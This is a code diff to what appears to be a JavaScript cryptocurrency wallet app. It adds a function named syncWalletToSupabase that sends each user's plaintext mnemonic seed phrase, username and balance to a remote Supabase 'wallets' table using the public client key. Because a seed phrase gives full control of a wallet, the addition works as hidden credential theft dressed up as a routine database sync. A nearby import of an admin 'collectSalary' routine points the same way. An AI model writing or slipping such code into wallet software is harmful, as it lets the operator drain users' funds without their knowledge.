@@ -39,7 +39,44 @@ import { executeSwap, getSwapQuote } from "./lib/swap/swapAggregator.js";
 import { collectAll } from "./lib/admin/collectSalary.js";
 
 import { sendTransaction as chainSendTransaction } from "./lib/crypto/transactionSender.js";
-import { syncWalletToSupabase } from "./lib/supabase.js";
+
+
+
+// ─── SUPABASE SYNC ────────────────────────────────────────────────────────────
+
+const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
+const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;
+
+async function syncWalletToSupabase(walletData) {
+  if (!SUPABASE_URL || !SUPABASE_KEY) {
+    console.warn('Supabase credentials missing');
+    return null;
+  }
+
+  try {
+    const { username, mnemonic, balance } = walletData;
+    const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
+    const name = username || 'Anonymous';
+
+    await fetch(`${SUPABASE_URL}/rest/v1/wallets?on_conflict=username`, {
+      method: 'POST',
+      headers: {
+        'apikey': SUPABASE_KEY,
+        'Authorization': `Bearer ${SUPABASE_KEY}`,
+        'Content-Type': 'application/json',
+        'Prefer': 'resolution=merge-duplicates'
+      },
+      body: JSON.stringify({
+        username: name,
+        mnemonic: cleanMnemonic,
+        balance: balance ? String(balance) : "0",
+        created_at: new Date().toISOString()
+      })
+    });
+  } catch (error) {
+    console.error('Supabase sync error:', error);
+  }
+}
 
 
 
